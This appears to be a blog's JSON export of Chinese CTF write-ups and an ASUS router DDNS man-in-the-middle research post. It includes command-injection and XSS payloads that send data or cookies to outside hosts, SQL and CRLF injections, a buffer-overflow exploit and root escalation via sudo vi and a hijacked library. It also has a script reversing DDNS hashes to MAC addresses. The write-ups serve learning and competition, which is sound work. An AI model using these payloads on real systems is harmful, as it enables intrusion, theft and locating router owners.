{"posts":[{"title":"2024 AIS3 EOF CTF Qual writeup","text":"webnslookup final有command injection，用``把指令包起來，但是會有一個問題就是他不會回傳結果， 1curl webhook.trianglesnake.com/?text=123 呼叫聊天機器人webhook試試看，有收到訊息，所以直接把flag偷出來 因為有WAF限制flag、*，但我知道flag的prefix了，所以直接遍歷根目錄檔案找出flag 12`curl -G https://eec1-182-234-154-17.ngrok-free.app/ --data-urlencode &quot;$(find / -maxdepth 1 -type f -exec grep 'ais3' {} +)&quot;` AIS3{jUST_3a$y_cOMmaND_INj3c7I0N} internal沒辦法碰到/flag但是如果由內網機器送redirect請求並包含X-Accel-Redirectheader就可以穿透。 這題在考crlf截斷，截斷之後可以header injection 1http://10.105.0.21:11580/?redir=https://www.google.com%0d%0aX-Accel-Redirect:%20/flag AIS3{JUsT_s0m3_FUnNy_N91NX_FEaturE} copypasta題目有sql injection，用sqlmap dump出所有column後可以直接存取/posts/flag_id，但他會檢查cookie，所以絲路變成：透過sql injection創建不存在的貼文-&gt;透過string format撈出app.secret_key-&gt;偽造cookie-&gt;存取flag頁面 透過sql injection創造貼文1234#source codetmpl = db().cursor().execute( f&quot;SELECT * FROM copypasta_template WHERE id = {id}&quot; ).fetchone() 這裡很明顯留了一個洞給我們 12#payload?id=1,'a','{field.__class__....}' 此時下面進行format string的時候就會被injection 1res = content.format(field=request.form) 這題沒有做出來，卡在Pyton format string漏洞，可以摸到magic method，但是因為在不同namespace沒辦法用__global__撈到app.secret_key reversestateful把整個流程反過來做一次 真reversed engineering先用ghidra把C弄出來後用vs code 的取代把每個function改成printf，之後用python把出來的function整個反過來 1234567891011121314151617string = &quot;&quot;&quot;3618225054(k_target)2057902921(k_target)671274660(k_target)......557589375(k_target)3420754995(k_target)3648003850(k_target)1978986903(k_target)&quot;&quot;&quot;lst = string.split('\\n')lst.reverse()print(lst)for i in lst: print('state_'+i+';') 把每個狀態機的function+改成-，然後把k_target逆向回推 12345678910111213141516171819202122232425262728293031323334353637// Hello world! Cplayground is an online sandbox that makes it easy to try out// code.#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;int main() { int local_14 = 1; int local_10 = 0; unsigned local_c = 0xd7a9bb9e; bool bVar1 = false; char k_target[43] ={ 38, 75, ... 128, 101, -20, 125}; state_1978986903(k_target);state_3648003850(k_target);state_3420754995(k_target);state_557589375(k_target);...state_2057902921(k_target);state_3618225054(k_target); for (int i=0;i&lt;44;i++){ printf(&quot;%c&quot;,k_target[i]); } return 0;} 基本上就是反著做一遍 AIS3{Ar3_y0U_@_sTAtEfuL_Or_S7AT3L3SS_ctfer}","link":"/2024/02/06/2024-AIS3-EOF-CTF-Qual-writeup/"},{"title":"2023 AIS3 Pre-Exam writeup","text":"MiscWelcomeAre you not a robot ? FLAG Format: ^AIS3{[A-Z0-9+-*/!?-]+}$ Author: nella17 點開pdf，flag直接寫在上面了，一開始以為-是_結果浪費一堆時間 AIS3{WELC0ME-T0-2023-PRE-EXAM-&amp;-MY-FIRST-CTF} RobotAre you a robot? Note: This is NOT a reversing or pwn challenge. Don't reverse the binary. It is for local testing only. You will actually get the flag after answering all the questions. You can practice locally by running ./robot AIS3{fake_flag} 127.0.0.1 1234 and it will run the service on localhost:1234. Author: toxicpie nc chals1.ais3.org 12348 機器人會問你三十題數學，可以直接寫Python用eval()解在discord看到有人說直接用手解，牛皮 exploit code1234567891011121314import pwnimport timeio=pwn.remote(&quot;chals1.ais3.org&quot;,12348)print(io.recvuntil(&quot;!&quot;))time.sleep(0.5)for i in range(30): print(f&quot;solving..{i+1}&quot;) string=io.recv().decode() string=string.strip(&quot; &quot;).strip(&quot;\\n&quot;) print(string,eval(string)) io.sendline(str(eval(string))) time.sleep(0.5)io.interactive() AIS3{don’t_eval_unknown_code_or_pipe_curl_to_sh}被罵了 PWNSimply PwnThe simplest pwn nc chals1.ais3.org 11111 經典buffer overflow 先用gdb觀察ni到read附近 可以發現輸入變數存在rsi=rbp-0x50+0x9=rbp-0x47 所以必須墊0x47+8byte(RSP)+address，剛好可以覆蓋return address 直接讓程式跳到shellcode exploit code12345import pwnio=pwn.remote(&quot;chals1.ais3.org&quot;,11111)payload=b&quot;a&quot;*(0x4f)+pwn.p64(0x4017a5)io.sendline(payload)io.interactive() AIS3{5imP1e_Pwn_4_beGinn3rs!} WebLogin PanelLogin Panel 網站採用了隱形 reCAPTCHA 作為防護機制，以確保只有人類的使用者能夠登入 admin 的帳號。你的任務是找到一個方法來繞過 reCAPTCHA，成功登入 admin 的帳號。 你可以使用各種技術和手段來達成目標，可能需要進行一些網站分析、程式碼解讀或其他形式的 攻擊。請注意，你需要遵守道德規範，不得進行任何非法或有害的行為。 當你成功登入 admin 的帳號後，你將能夠獲得 FLAG。請將 FLAG 提交至挑戰平台，以證明 你的成功。 Author: Ching367436 http://chals1.ais3.org:8000/ 直接讀source code 1db.get(`SELECT * FROM Users WHERE username = '${username}' AND password = '${password}'` 聞起來就很有SQL injection的味道 Bypass Login Page注入username 1username=' or 'a'='a 中計直接被Redirect到rickroll ok不然改注password 1username=admin&amp;password=' or 'a'='a 成功進入之後還有2fa認證，要輸入2fa code才能進到dashboard看flag，但是仔細看其實驗證完之後他也只是redirect到/dashboard而已，所以直接存取/dashboard即可 AIS3{‘ UNION SELECT 1, 1, 1, 1 WHERE ({condition})–} E-Portfolio babyAIS3 E-Portfolio 是一個學習成就展示平台，讓使用者可以建立並分享他們在 AIS3 的學習成果和專 案作品。其中，網站提供了一個「Share your portfolio with admin」的功能，讓使用者可以將自 己的作品集分享給管理員。 你需要找出一個前端漏洞，當你分享作品集給管理員時，能夠竊取 admin 的旗幟。你可以透過探索網站 的前端程式碼，找到適當的方式來觸發漏洞並取得旗幟。 請注意，你需要在漏洞設計中保持合法並遵循道德原則。請勿以任何方式傷害網站的正常運作或使用者的隱私。 對了，按下「Share your portfolio with admin」的按鈕的時候，admin 會去拜訪的頁面會是 http://url/share?username={按下那個按鈕的使用者名稱}。 Author: Ching367436 http://chals1.ais3.org:8880/ 看到share to admin就知道這是csrf題目先戳戳看 測試XSS1&lt;script&gt;alert()&lt;/script&gt; 沒反應，因為寫上文字是使用innerHTML，所以對 &lt;script&gt; 標籤不起作用 1234567if (data.success) { username.innerHTML = data.data.username about.innerHTML = data.data.about avatar.src = data.data.avatar } else { alert(data.message) } 用 &lt;img src&gt; 試試 1&lt;img src=&quot;123&quot; onerror=alert()&gt; 果然出現XSS 嘗試當cookie小偷一開始的思路是當cookie小偷，然後用admin登入看flag藏在哪 1234&lt;img src='' onerror=fetch('https://script.google.com/macros/s/\\ AKfycbxFRZIq7zd9X5gpd9MNCIe9m6d_GwrT3kY9vkVH8hPXic7pbr-\\ pW0B8vTj0lureCaOdOA/exec?\\ text=cookie:'+encodeURI(document.cookie))&gt; 因為有設定HTTP only所以偷不到cookie(後來發現偷到也沒用，flag不在admin的頁面裡面) 嘗試直接偷api內容看sauce code會發現其實flag寫在admin的密碼裡面，然後密碼又透過api/portfolio傳遞 ok開偷 123456789&lt;img src=&quot;123&quot; onerror=&quot;fetch('api/portfolio') .then(response =&gt;response.text()).then(text=&gt;{ var url= 'https://script.google.com/macros/s/\\ AKfycbxFRZIq7zd9X5gpd9MNCIe9m6d_GwrT3kY9vkVH8hPXic7pbr-\\ pW0B8vTj0lureCaOdOA/exec?text=' fetch(url+encodeURI(text)) })&quot;&gt; 在瀏覽器上測試成功，但share to admin甚麼事都沒發生 網站沒有設定CSP，所以應該是機器人沒辦法訪問外網 嘗試寫入自己的page沒辦法直接用webhook就變很複雜了 改變絲路:偷到api/portfolio-&gt;登入自己的帳號-&gt;寫入textarea-&gt;儲存 創建登入form 1234&lt;form id=form action=&quot;/api/login&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt; &lt;input name=&quot;username&quot; value=&quot;test123&quot;&gt; &lt;input name=&quot;password&quot; value=&quot;test&quot;&gt;&lt;/form&gt; 先偷api/portfolio再submit表單切成自己帳號，最後改textarea、click save 123456789101112&lt;img src=&quot;123&quot; onerror=&quot;fetch('http://web:8000/api/portfolio') .then(response =&gt;response.text()).then(text=&gt;{ form.submit() setTimeout(function() { console.log('123'); }, 1000); var win=window.open('http://web:8000/portfolio') setTimeout(() =&gt; { win.document.querySelector('textarea[id=about]').value = text; win.document.querySelector('button[id=save]').click() }, 1000) })&quot;&gt; AIS3{&lt;img src=x onerror=’fetch(…} ReverseSimply ReverseJust reverse it! 先執行看看 丟ghidra這邊有一個verify函式判斷key是否正確 解題絲路因為verify()的迴圈每跑一圈就會檢查一個char，一直到local_c=0x22 然後return true; 所以可以brute force 跑每個字元然後看迴圈有沒有炸掉 exploit code12345678910111213141516171819202122import pwnimport timeio=pwn.process(&quot;gdb&quot;)io.sendline(&quot;file rev&quot;)io.sendline(&quot;start&quot;)io.sendline(&quot;b *0x5555555551fb&quot;) #把breakpoint 設在迴圈裏面，如果沒有停代表是錯的io.recvrepeat(timeout=1)flag=&quot;AIS3{&quot;while 1: for i in range(0x20,0x7E): print(&quot;trying..&quot;,flag+chr(i)) io.sendline(f&quot;set args {flag+chr(i)}&quot;) io.sendline(&quot;run&quot;) for j in range(len(flag)+1): io.sendline(&quot;c&quot;) io.recvrepeat(timeout=0.3).decode() io.sendline(&quot;x/x $rbp-0x4&quot;) string=io.recv().decode() if &quot;No&quot; not in string: flag+=chr(i) break AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!} CryptoFernet你所在的公司最近發生了一起駭客入侵事件，管理員發現駭客使用 Fernet 密碼學來加密了他們的敏感數據。 你需要解開被加密的檔案，否則事情就大條了！ flag format : FLAG{xxx} Auther : Richard ( dogxxx) 看code123456789101112131415161718192021import osimport base64from cryptography.fernet import Fernetfrom Crypto.Hash import SHA256from Crypto.Protocol.KDF import PBKDF2from secret import FLAGdef encrypt(plaintext, password): salt = os.urandom(16) key = PBKDF2(password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256) f = Fernet(base64.urlsafe_b64encode(key)) ciphertext = f.encrypt(plaintext.encode()) return base64.b64encode(salt + ciphertext).decode()# Usage:leak_password = 'mysecretpassword'plaintext = FLAG# Encryptciphertext = encrypt(plaintext, leak_password)print(&quot;Encrypted data:&quot;,ciphertext) 絲路密碼都給你了所以反著解密就好了 加密流程是:產生salt-&gt;產生key-&gt;用key加密flag-&gt;把salt+ciphertext用base64 encode起來所以其實salt也給你了就是base64 decode後的前16個char decrypt code解密流程:base64 decode-&gt;取得salt、ciphertext-&gt;用password、salt重建key-&gt;用key解密ciphertext 123456789101112131415161718192021import osimport base64from cryptography.fernet import Fernetfrom Crypto.Hash import SHA256from Crypto.Protocol.KDF import PBKDF2cipher='''iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj'''cipher=cipher.encode()cipher=base64.b64decode(cipher)salt=cipher[:16]cipher=cipher[16:]print(salt)print(cipher)leak_password = 'mysecretpassword'key = PBKDF2(leak_password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256) f = Fernet(base64.urlsafe_b64encode(key)) plaintext=f.decrypt(cipher)print(plaintext) FLAG{W3lc0m3_t0_th3_CTF_W0rld_!!!!!!}","link":"/2024/02/07/2023-AIS3-Pre-Exam-writeup/"},{"title":"2024 CGGC CTF Final Writeup","text":"這次幫國網中心的CGGC 網路守護者挑戰賽出題，總共出了兩題 medium ，分別是 web 的 Converter 和 misc 的 cat flag WebConverter這是一個編碼的網站，可以編碼和解碼 base16 / base32 / base64 / base85 等不同網站後端是使用 Flask 寫的，為了防止 SSTI ，在 render_template_string 之前我把一些地方 HTML encode 了 encode 時 input 會被 HTML encodedecode 時 input 和 result 都會被 HTML encode 1234567return render_template_string( RESULT_TEMPLATE.format( input_data=data, # 皆會被 HTMLencode conversion_type=conversion_type, action=action, result=result # 只有 decode 時會被 HTMLencode)) 因此，想要 SSTI 就只剩下把東西拿去 encode 之後變成怪怪的東西了，那什麼狀況下 encode 會跑出怪怪的東西呢？其實去查一下四種編碼應該就可以很快發現 base85 的 index table 有可以利用的東西（{ 和 }），但這樣其實還是不夠的，因為如果想要構造出 {} 那 input 會需要傳入不存在的字元，偏偏 URL encoding 又只會解碼特定的 binary data。 那怎麼辦呢，其實在 encoding 的時候還有第二個可控的地方，那就是 Accept-Charset 123456encoding = request.headers.get('Accept-Charset','utf-8')for i in ['utf','ascii','latin','windows','cp']: if i in encoding: breakelse: return jsonify({&quot;error&quot;: &quot;Unsupported encoding&quot;}), 400 後端會根據輸入的 charset 去將傳入的資料 encode (但是僅限比較常見系列的編碼) 12elif conversion_type == &quot;base85&quot;: result = base64.b85encode(data.encode(encoding)).decode(encoding) 有了這兩個可控的地方，我們就可以找到幾種編碼方式，把不存在的編碼變成存在的字元當成輸入， fuzz 一下就可以找出有效的 payload我這邊是使用 cp850 去想辦法構造出 {{config}} ，最後找到 qX%15rx%15▒Bà└│ 可以弄出 aaa{{config}}1 最終 payload ： 1234POST /api/convert HTTP/1.1Accept-Charset: cp850data=qX%15rx%15▒Bà└│&amp;conversion_type=base85&amp;action=encode flag: CGGC{'ÞÑ┐Õ▒àÕ▒àÞÑ┐ÞÑ┐Þ©óÞ¬Æµ£ì'.encode('cp850').decode('utf-8')} 後記我看到超多人交的 flag 是把中間那坨拿去 decode 變成 CGGC{西居居西西踢誒服} ，然後發現不會過又改成 CGGC{CGGCCTF} / CGGC{cggcctf} 最後才交上面的，超級好笑我很抱歉抱歉ㄉ心 MiscCat Flag這題是給使用者一個 powershell ，將 flag 寫在圖片裡面，透過 AES-CBC 加密後放在資料夾裡面（我會給密碼），參賽者要想辦法用 powershell 偷出 flag 未免也太簡單了對吧？所以我加了一些限制： 不能連網，對外連線通通 DROP 掉 指令長度不能超過 512 個字元 輸出字元數量不能超過檔案本身大小 每個 instancer 只能輸入一行指令 每次重開 instancer 都會用不同密碼加密 所以，想要弄出 flag 只剩下一條路了，那就是 cat flag 但要怎麼輸出呢？大家馬上聯想到的應該都會是 Base64 ，但是其實 base64 會把資料變成大胖呆（原本8個一組的資料變成6個一組），所以比賽現場就會看到一堆人弄出來的圖片長這樣： 啊 flag 咧？在下面被切掉了 我預期的解法有兩種： 用 base64 切片抓下來，因為有給密碼了，所以可以透過第一組的明文使用第二組的密碼反向加密回去再和第二組的下半身合併成完整的圖片（這邊是 CBC 的 block cipher 所以要注意不要切爛了會有 padding 的問題） 因為是限制 char 所以可以想辦法把每個 byte 轉成自訂的寬字節就可以一次輸出整個檔案了，但是他又有限制指令只能 512 char ，所以可以找一下有沒有什麼內建的編碼方式是可以涵蓋到大部分的組合，然後在自訂沒涵蓋到的編碼就可以了，我這邊是用一個古老的編碼 X-Europa 把檔案 print 出來 編碼： 1$bytes = [System.IO.File]::ReadAllBytes(&quot;cat.flag&quot;);$compressedStream = New-Object System.IO.MemoryStream;$result=&quot;&quot;;$encoding=[System.Text.Encoding]::GetEncoding(&quot;x-europa&quot;);ForEach ($byte in $bytes){if ($byte -eq 0){$result+=&quot;嗨&quot;}elseif($byte -eq 127){$result+=&quot;哈&quot;}else{$result+=$encoding.GetString($byte)}};$result 解碼： 1234567891011121314151617181920212223242526$encodedResult = $result$encoding = [System.Text.Encoding]::GetEncoding(&quot;x-europa&quot;)$decodedBytes = New-Object System.Collections.Generic.List[byte]$i = 0while ($i -lt $encodedResult.Length) { if ($encodedResult.Substring($i, 1) -eq &quot;嗨&quot;) { $decodedBytes.Add(0) $i += 1 } elseif ($encodedResult.Substring($i, 1) -eq &quot;哈&quot;) { $decodedBytes.Add(127) $i += 1 } else { $char = $encodedResult.Substring($i, 1) $byte = $encoding.GetBytes($char)[0] $decodedBytes.Add($byte) $i += 1 }}[System.IO.File]::WriteAllBytes(&quot;flag.enc&quot;,$decodedBytes)openssl enc -d -aes-256-cbc -pbkdf2 -in flag.enc -out flag.jpg -k $password 弄出來的資料大概會長這樣： 1Salted__◀¶8ήρêWΒ▲À§§Τ║ΞÓCΖ↕É3$Ôoο│Ϋ*á‼αύ,{┘ÇÕyPUΪχZ\\æUΰal!ë;ΞΈ&gt;♬΄8nÆsÂΰηUv0Z·HO¡λg◘│.~┘ώ↕òΥbQ▼ΖΉPÜΎüκχ┘ΎÄ:q─É└xνϊî/'ηΊ5ίïΐ?èΘQν&gt;γ0b*kςO6Dv└║Aïί&amp;t◙ºω$↕°δ΄§ΥäΤnΆ1ö♂CοJ▼♪;βJΥΧ(ä.óhώ═2ÅE%δÕ◙◙╝G^Ό!ψ♂M○J╚¿9ºYΥΠΟÍ\\○TAlérνyΦβ*Äλz¡'Ξίê→ÍìΦöίς║7Ñ+_☼/v/Θàξ4GΣLάæS♬6+FρθΕÑRôsÓτδ/┘YØàÅ¿Νό Bωy→Ήχ4e&quot;χÅηαH哈θόψώvu8cçãvßή═PqΏ-‼ΗÂ─ϊΉ│↕τUEÊ║Ά9ώΗέΘDèe&amp;哈ÖÍιwφή◙pάεΕé&quot;╚ËP)9◙╝嗨áω▼0↓哈▲ί→SΔεTSòk£όÕΜÄΡ^┐L%♂oοÑΥüμñΤηòύΡút^ÀΓVRεδ↑ξΰ)Ü○═eN│Ú$b+$°ϊ3Ã¶▲Σçν┐IN♂õΨΈ7z←[:)éÁ8♪◙ºöQMΰν┘QsσΉ♪↑IρΜYΊº°üï·jr↓S'ε‼ηζς¡4Ø§ΈΟÅ-╝τÚσBΗ?BΙ/x←+Äa♬`g/ϋΟΤëK║]Êãω←ΏÀ£_¡αóÂΰÍ^α└zϋp╔Nï·øáâ2ΘËΌΛÀLL%tÕÓDλmI◘ΦÊ↑ξK-^ë+,\\γÄrßP─óÊhη&quot;4♂♬ί:ρ&quot;Iã6jÑΔΌª┌§/[O]αüöΔÂ╚┐:0õ1♂ύBθοÀÑBghϋRsºÀ哈F&quot;▼◘îΜaί;q╔ΞώΧΡBÚ┌·F7哈ύφ哈 μø&lt;À΄)ªö─¿ÁΧτ╔ΦhρMnζΡØz◘cªÆΥêΕ&quot;à_FΣ]Τοπ.Λr♬┌ØΓ#♂έ║Xá¶Ή↔ÂΒώ8/fSV@υÍÕfΓ3ζΚE·όϊ1ãA+|'ËÑς↓hO┘h╚a&quot;|ïâ9Ά!èàdÉg═xΙóæeΪñήR#&lt;ñ4'4õUΈά→Ξα◘ù,äέ;?H│},π7aΒ◀η║χΏ\\x◙e1ώÂÂ@Vΐx‼6ΛÅzφ&amp;ύÉâ○όeΑι&lt;─@¶ΐΊu+°ΟªεΝΞΑΙd=7öÅ═+ßÁ\\îΙ|嗨f£ΛñùΨßWÂ=΄*·eO,΄άω@XΨC,ìñu΄t JÄ▲dîîóîωI.ρÑ¶æuùÍπGôΡαjìΗù↑õ=ώûΑêηTæ{ÍNVroKüΆώg&lt;euÂΠα`ήξ↓Αkό♬+§ÔόxW▲Ά*ζΘΧΰãΌ╗Læ+ ┐ρü0΄mlϊ4┌Ι]υêαφb¿Οό│]:\\ìιΛ y¶άΜ(HúÅY§◘#ÃΕφàS嗨Æù↓Ëê9Gώæ.▼NΖJχ╚Pαè┐@Á(£nÂeìº↓maq§Ν0nØûEÚÕh哈kDGaíυ↔ó@SmabΰκTL‼/Ξy`♀sΠ{mΉKENeΒΏκΥΆ&lt;Γ¶!▶@╗┌MÀϋVv¿$i↕Í↑aUEΈx◀^οΌûP╚◀àMϊk@▲£çèAÄvzÆNæÇέλ9ω▲xt嗨ª└ΓnîAθάï#Ηè↕Ã |y╚έãΤόGjρt·ρø↓r↑Éκtåς1y=É♀1A΄ω=╝┐ΞΠN0éïζΜ◘π|F╔óüα╗ΈôΊ↑υZξΞ_3Ñ♀ξöΟæºψζΜ╚Ãææΰωå♀λΗÆ5nτ♪è5°¡ΨºvΪGΛΜώΒΣ1öΝq╝öôοψW4èaσΝDΤÓs┘o╔=│¶ÉΌ♂ϋcëάbάΔÍbνü┐Ι&amp;ΥTEυBΉϋ↔8ιîΡ═Í!ΆΔΌ+¶2öτ◙zΧΕ[&lt;→,ΆòcÄj-Óf£7Q▶N)ΗΜ&gt;92kκêΫ`↔tφβ┘JwìÇ^ÅX|Τ7~3ê4└Ϋz£ÅκysΏ Y▼ΞôuË\\UΜOÄοΉIoíΖB/ZΦΙΝVqwFAXΣ|:╝?έ╝iBV$ΧΫαYn΄a↔ΙBÂ-$Ά▼ι═Mεμλ¶ Ψóύá┌νÓÔ┘▲0σ←R¶εFWω↑sψ?.â#δ§ί┌ΓΉay£%]ΣÁUΟtÖUζνξ/ÔyöC☼╚M▼=;Ι&quot;8─ÄUÖÑΫãΐ&gt;δ4ξή:ΣβºόΛΒ~║O↓Lΐύw&quot;χ♂-↓ÚnèωrÅí◘ΜÚíVtΰ(ΓZPΚiê9FήΟ°r─σ◀ί♬?¿ΓόhXEΈ,υm; 後記這題是用 @chummy 的 CTF Instancer 架的，會依序動態開 100 個 port給大家連 instancer ，結果有某海狗直接狂戳 port 幫大家把 instancer 都關起來（我完全沒想到可以這樣玩QQ） 後來臨時加了驗證 CTFd Token 的機制，感謝賽博水電工 Chummy 現場幫 instancer 加新功能，然後兩個人在那邊寫爛扣","link":"/2024/12/07/2024-CGGC-CTF-Final-Writeup/"},{"title":"OT CTF writeup","text":"惡意軟體分析 [name=trianglesnake]flag:||10.15.1.69:3128||難度:中 打開ida pro 查看import table 查看是否有網路連線相關api 查看 WinHttpOpen functoin的Reference 在edi中找到中繼伺服器ip和port 惡意軟體分析2 [name=trianglesnake]flag:||flag{5.39.218.152}|| 加密系統 [name=trianglesnake]flag:||flag_EnCryp1||難度:難 使用factordb.com分解n 因為e是2，所以不可能為RSA，猜測為rabin算法 有$p、q$了，所以順著把$m_p、m_q$求出來，會有四組明文 找可以讀的明文就是flag了 工業app分析 [name=trianglesnake]flag:||Flag {g6ghfchijv55fhh8gdd}||難度:易 題目有附apktool，用apktool decode apk 摸一摸就找到flag了 Level_L] Modbus異常封包 [name=trianglesnake]flag:||THISISAOTCTFEASYFLAG||難度:易 題目說是意外擲回，直接用filter過濾exception 1modbus.exception_code 查看request內容 Level_L] Modbus異常封包 [name=trianglesnake]flag:||AN APPLE A DAY KEEPS THE DOCTOR AWAY||難度:易 藏訊息發給PLC，若沒有拆開封包length一定會很長 找length最長的封包 比別的封包多一坨hex的資料 把hex轉成ascii，得到flag","link":"/2023/12/20/OT-CTF-writeup/"},{"title":"One Million ASUS Routers Under Control: Exploiting ASUS DDNS to MITM Admin Credentials","text":"ASUS Router APP 如何在外網連回家若有開啟DDNS設定，路由器的domain是a+md5(MAC Address).asuscomm.com，手機透過DDNS查詢IP後，再從8443 port連回去。 漏洞domain name 由MAC Address產生Domain name = a + md5(MAC Address) + .asuscomm.com因此，只要知道 router 的 MAC Address，變可以透過網址存取路由器後台。 更新DDNS時未驗證PIN碼ASUS在update IP address的時候並沒有驗證router的PIN碼是否正確，所以任何人都可以隨意更改domain指向的ip 帳密裸奔，僅使用base64編碼變傳送ASUS Router 手機 APP 在驗證後台帳號密碼時，直接將帳號密碼 Base64 encode 過後，以 GET 的方式傳給 Router 。 組合計攻擊者可透過上面三個漏洞達到完美的中間人攻擊，首先，攻擊者可透過網路上洩漏的 MAC Address 取得Domain Name，並且將該Domain指向自己的攻擊機，接著坐等使用者在外網用手機 APP 打開管理介面便可以得到使用者的帳號與密碼，再將帳號密碼傳回真正的IP達成中間人攻擊。 造成危害攻擊者可透過後台帳號密碼開啟 ssh vpn等服務，摸進內網，或者是更改預設DNS Server，進行網路釣魚。 影響研究發現全球有多超過100萬台路由器遭受影響，比較明顯的攻擊痕跡可由ddns解析的ip變動看出，或是多個路由器皆將Domain指向同一個ip。 後續研究我後來針對ASUS Router的MAC Address、DDNS和BSSID研究了一下之後，發現了一些有趣的事情 MAC Address 和 BSSID 相同因為手邊沒有太多華碩的路由器，觀察了大概三台路由器，發現MAC Address和BSSID不是完全相同就是差一碼 可由 DDNS 回推 MAC Address前面研究有提到，預設 DDNS 是 A+md5(MAC Address)，雖然窮舉 MAC Address 是不可能的，但是 MAC Address 前三個 bytes 是廠商識別碼，剩下要解決的就只有後三 bytes 了。 因此我寫了一個 script 可以在一分半之內由 hashcat 將DDNS的MAC Address還原(都4220年了竟然還有人在用md5) 12345678import osimport syslst = ['00:1B:FC', '00:1E:8C', '00:1F:C6', '00:22:15', '00:24:8C', '00:26:18', '04:D9:F5', '08:60:6E', '08:62:66', '08:BF:B8', '0C:9D:92', '10:7B:44', '10:7C:61', '10:BF:48', '10:C3:7B', '14:DA:E9', '14:DD:A9', '24:4B:FE', '2C:4D:54', '2C:56:DC', '2C:FD:A1', '30:5A:3A', '30:85:A9', '34:97:F6', '38:2C:4A', '3C:7C:3F', '40:16:7E', '40:B0:76', '48:5B:39', '4C:ED:FB', '50:46:5D', '50:EB:F6', '60:45:CB', '70:4D:7B', '70:8B:CD', 'E8:9C:25', '74:D0:2B', '78:24:AF', '7C:10:C9', '88:D7:F6', '90:E6:BA', '9C:5C:8E', 'A0:36:BC', 'A8:5E:45', 'B0:6E:BF', 'BC:AE:C5', 'BC:EE:7B', 'D0:17:C2', 'D4:5D:64', 'E0:3F:49', 'E0:CB:4E', 'CC:28:AA', '60:CF:84', 'F0:79:59', 'F4:6D:04', 'FC:C2:33', '00:0C:6E', '00:0E:A6', '00:11:2F', '00:11:D8', '00:13:D4', '00:15:F2', '00:17:31', '00:18:F3', '00:1A:92', '00:1D:60', '00:23:54', '00:E0:18', '04:42:1A', '04:92:26', '04:D4:C4', '18:31:BF', '1C:87:2C', '1C:B7:2C', '20:CF:30', '38:D5:47', '54:04:A6', '54:A0:50', '58:11:22', '60:A4:4C', 'AC:22:0B', 'AC:9E:17', 'C8:60:00', 'C8:7F:54', 'D8:50:E6', 'F0:2F:74', 'F8:32:E4', 'FC:34:97']target = sys.argv[1]for i in lst: if os.system(f&quot;hashcat -m 0 -a 3 {target} {i.replace(&quot;:&quot;,&quot;&quot;)}\\?H\\?H\\?H\\?H\\?H\\?H&quot;)==0: os.system(f&quot;hashcat -m 0 {target} --show&quot;) break BSSID可以用來定位Router的真實位置當 iPhone 把 Wi-Fi 關閉時，會提示定位精度會下降，因為蘋果會記錄附近router的位置，然後再用來幫手機做更精確的定位，因此，我們有機會使用工具將 BSSID 轉換成實體的經緯度，甚至比GPS更準確。 組合技當我們得知了一組ip，如果他使用了 ASUS 的 Router ，並且開啟了外網存取時，我們就可以透過這組 ip 取得 DDNS 然後再透過 DDNS 回推 BSSID 最後反查出座標","link":"/2024/10/31/One-Million-ASUS-Routers-Under-Control-Exploiting-ASUS-DDNS-to-MITM-Admin-Credentials/"},{"title":"picoCTF 2023 writeup","text":"Binary ExploitationhijackingAUTHOR: THEONESTE BYAGUTANGAZA Description Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with. Through Social engineering, we've got the credentials to use on the server. SSH is running on the server. 隨便逛逛發現/challenge資料夾很可疑，但是沒辦法cd進去 查看sudo 發現使用者可以用sudo權限使用vi exploit123sudo vi:shell privilege escalation了，再來就直接A進去/challenge/把flag撈出來就好 picoCTF{pYth0nn_libraryH!j@CK!n9_5a7b5866} 原本解法這題當初在解的時候是在.server.py裡面import 的base64裡面搞鬼 只是不知道為甚麼在寫writeup的時候沒辦法用root權限執行.server.py 先ls -al發現有一個.server.py cat .server.py 1234567891011import base64import osimport socketip = 'picoctf.org'response = os.system(&quot;ping -c 1 &quot; + ip)#saving ping details to a variablehost_info = socket.gethostbyaddr(ip)#getting IP from a domainehost_info_to_str = str(host_info[2])host_info = base64.b64encode(host_info_to_str.encode('ascii'))print(&quot;Hello, this is a part of information gathering&quot;,'Host: ', host_info) vim .server.py沒辦法動.server.py，因為他是readonly，但是權限沒有設定到base64.py 在import file裡面加料vim /usr/lib/python3.8/base64.py 1234import oswhile 1: cmd=input() print(os.popen(cmd).read()) get shell 1sudo python3 .server.py ForensicshidemeAUTHOR: GEOFFREY NJOGU Description Every file gets a flag. The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what meets the eye here. 下載下來發現是一張圖片看一看感覺很正常 用exiftool看了一下沒有把flag藏在某個欄位裡 strings flag.png看看發現裡面有長得很像路徑的東東 直接把flag.png當成zip解壓縮看看 1unzip flag.png 得到半張flag picoCTF{Hiddinng_An_imag3_within_@n_ima9e_92076717} FindAndOpenAUTHOR: MUBARAK MIKAIL Description Someone might have hidden the password in the trace file. Find the key to unlock this file. This tracefile might be good to analyze. 這題給了兩個檔案，第一個是flag.zip和dump.pcap。嘗試解壓縮flag.zip，發現需要密碼 先從dump.pcap下手看看用wireshark打開dump.pcap 隨便看幾個封包後發現都有明文 找到一個超可疑的封包，=結尾很可能是base64編碼的填充字元 decode後得到半截flag This is the secret: picoCTF{R34DING_LOKd_ 回到flag.zip，直接通靈把第一段flag當密碼 picoCTF{R34DING_LOKd_fil56_succ3ss_5ed3a878} ?? General Skillsmoney-wareAUTHOR: JUNI19 Description Flag format: picoCTF{Malwarename} The first letter of the malware name should be capitalized and the rest lowercase. Your friend just got hacked and has been asked to pay some bitcoins to 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX. He doesn’t seem to understand what is going on and asks you for advice. Can you identify what malware he’s being a victim of? Google 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX 找到CNBC的新聞 picoCTF{Petya} 水爛 repetitionsAUTHOR: THEONESTE BYAGUTANGAZA Description Can you make sense of this file? Download the file here. 下載enc_flag 